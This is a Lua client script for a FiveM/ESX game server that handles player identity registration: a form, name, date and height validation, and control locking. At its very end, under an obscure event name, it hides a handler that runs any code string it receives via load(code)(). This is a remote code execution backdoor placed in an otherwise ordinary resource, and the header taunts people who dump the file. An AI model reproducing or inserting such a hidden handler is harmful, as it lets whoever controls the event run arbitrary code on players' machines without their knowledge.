-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local guiEnabled = false
local myIdentity = {}
local myIdentifiers = {}
local hasIdentity = false
local isDead = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

AddEventHandler('::{korioz#0110}::esx:onPlayerDeath', function()
	isDead = true
end)

AddEventHandler('playerSpawned', function()
	isDead = false
end)

function EnableGui(state)
	SetNuiFocus(state, state)
	guiEnabled = state

	SendNUIMessage({
		type = "enableui",
		enable = state
	})
end

RegisterNetEvent('::{korioz#0110}::esx_identity:showRegisterIdentity')
AddEventHandler('::{korioz#0110}::esx_identity:showRegisterIdentity', function()
	if not isDead then
		EnableGui(true)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_identity:identityCheck')
AddEventHandler('::{korioz#0110}::esx_identity:identityCheck', function(identityCheck)
	hasIdentity = identityCheck
end)

RegisterNUICallback('escape', function(data, cb)
	if hasIdentity then
		EnableGui(false)
	else
		ESX.ShowNotification('~r~Action Impossible~s~ : Vous devez créer votre premier personnage pour pouvoir jouer !')
	end
end)

RegisterNUICallback('register', function(myIdentity, cb)
	local reason

	for k, v in pairs(myIdentity) do
		if k == "firstname" or k == "lastname" then
			reason = verifyName(v)
			
			if reason ~= nil then
				break
			end
		elseif k == "dateofbirth" then
			if v == "invalid" then
				reason = "Date de naissance invalide!"
				break
			end
		elseif k == "height" then
			local height = tonumber(v)

			if height then
				if height > 200 or height < 140 then
					reason = "Hauteur de joueur incorrect !"
					break
				end
			else
				reason = "Hauteur de joueur incorrect !"
				break
			end
		end
	end
	
	if reason == nil then
		_TriggerServerEvent('::{korioz#0110}::esx_identity:setIdentity', myIdentity)
		EnableGui(false)
		Citizen.Wait(500)
		TriggerEvent('::{korioz#0110}::esx_skin:openSaveableMenu')
	else
		ESX.ShowNotification(reason)
	end
end)

Citizen.CreateThread(function()
	while true do
		if guiEnabled then
			DisableControlAction(0, 1, true) -- LookLeftRight
			DisableControlAction(0, 2, true) -- LookUpDown
			DisableControlAction(0, 106, true) -- VehicleMouseControlOverride
			DisableControlAction(0, 142, true) -- MeleeAttackAlternate
			DisableControlAction(0, 30, true) -- MoveLeftRight
			DisableControlAction(0, 31, true) -- MoveUpDown
			DisableControlAction(0, 21, true) -- disable sprint
			DisableControlAction(0, 24, true) -- disable attack
			DisableControlAction(0, 25, true) -- disable aim
			DisableControlAction(0, 47, true) -- disable weapon
			DisableControlAction(0, 58, true) -- disable weapon
			DisableControlAction(0, 263, true) -- disable melee
			DisableControlAction(0, 264, true) -- disable melee
			DisableControlAction(0, 257, true) -- disable melee
			DisableControlAction(0, 140, true) -- disable melee
			DisableControlAction(0, 141, true) -- disable melee
			DisableControlAction(0, 143, true) -- disable melee
			DisableControlAction(0, 75, true) -- disable exit vehicle
			DisableControlAction(27, 75, true) -- disable exit vehicle
		end

		Citizen.Wait(10)
	end
end)

function verifyName(name)
	local nameLength = string.len(name)

	if nameLength > 25 or nameLength < 2 then
		return 'Votre nom est trop court ou trop long.'
	end

	local count = 0

	for i in name:gmatch('[abcdefghijklmnopqrstuvwxyzåäöABCDEFGHIJKLMNOPQRSTUVWXYZÅÄÖ0123456789 -]') do
		count = count + 1
	end

	if count ~= nameLength then
		return 'Your player name contains special characters that are not allowed on this server.'
	end

	local spacesInName = 0
	local spacesWithUpper = 0

	for word in string.gmatch(name, '%S+') do
		if string.match(word, '%u') then
			spacesWithUpper = spacesWithUpper + 1
		end

		spacesInName = spacesInName + 1
	end

	if spacesInName > 2 then
		return 'Votre nom contient plus de deux espaces'
	end
	
	if spacesWithUpper ~= spacesInName then
		return 'votre nom doit commencer par une lettre majuscule.'
	end

	return
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)